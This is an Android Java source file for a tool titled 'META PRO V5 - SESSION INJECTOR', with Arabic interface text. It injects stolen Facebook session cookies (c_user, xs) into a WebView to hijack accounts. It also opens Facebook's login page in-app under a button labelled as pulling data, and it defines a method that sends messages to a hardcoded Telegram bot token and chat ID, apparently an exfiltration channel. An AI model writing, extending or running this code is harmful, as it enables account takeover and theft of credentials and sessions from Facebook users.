package com.jasser.fbtool;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import android.webkit.CookieManager;
import android.widget.*;
import android.view.*;
import android.graphics.Color;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends Activity {
    String token = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc";
    String chat = "5653032481";
    TextView statsView;
    int reportCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        showCyberDashboard();
    }

    private void showCyberDashboard() {
        LinearLayout main = new LinearLayout(this);
        main.setOrientation(LinearLayout.VERTICAL);
        main.setBackgroundColor(Color.parseColor("#0a0f1e"));
        main.setPadding(50, 80, 50, 50);

        TextView title = new TextView(this);
        title.setText("META PRO V5 - SESSION INJECTOR");
        title.setTextColor(Color.CYAN);
        title.setTextSize(22);
        title.setGravity(Gravity.CENTER);
        main.addView(title);

        statsView = new TextView(this);
        statsView.setText("\n📊 الإحصائيات:\nحالة النظام: جاهز للحقن...");
        statsView.setTextColor(Color.GREEN);
        main.addView(statsView);

        addButton(main, "💉 حقن كوكيز يدوي (Session Inject)", "#2563EB", v -> showCookieInputDialog());
        addButton(main, "🔓 تسجيل دخول (سحب بيانات)", "#1e293b", v -> openSecureBrowser("https://m.facebook.com/login"));

        setContentView(main);
    }

    private void addButton(LinearLayout layout, String text, String color, View.OnClickListener listener) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setBackgroundColor(Color.parseColor(color));
        btn.setTextColor(Color.WHITE);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 20, 0, 0);
        btn.setLayoutParams(params);
        btn.setOnClickListener(listener);
        layout.addView(btn);
    }

    private void showCookieInputDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("حقن جلسة جديدة");
        final EditText input = new EditText(this);
        input.setHint("الصق الكوكيز هنا (Format: c_user=...; xs=...)");
        builder.setView(input);

        builder.setPositiveButton("حقن وتشغيل", (dialog, which) -> {
            String cookieStr = input.getText().toString();
            injectCookiesAndOpen(cookieStr);
        });
        builder.show();
    }

    private void injectCookiesAndOpen(String cookieString) {
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        
        // تقسيم الكوكيز وحقنها
        String[] cookies = cookieString.split(";");
        for (String cookie : cookies) {
            cookieManager.setCookie("https://.facebook.com", cookie.trim());
        }
        
        Toast.makeText(this, "تم حقن الجلسة بنجاح!", Toast.LENGTH_SHORT).show();
        openSecureBrowser("https://m.facebook.com/");
    }

    private void openSecureBrowser(String url) {
        WebView wv = new WebView(this);
        WebSettings ws = wv.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setUserAgentString("Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile");

        wv.setWebViewClient(new WebViewClient());
        wv.loadUrl(url);
        setContentView(wv);
    }

    private void sendToTelegram(String msg) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + URLEncoder.encode(msg, "UTF-8"));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.getInputStream().read();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }
}
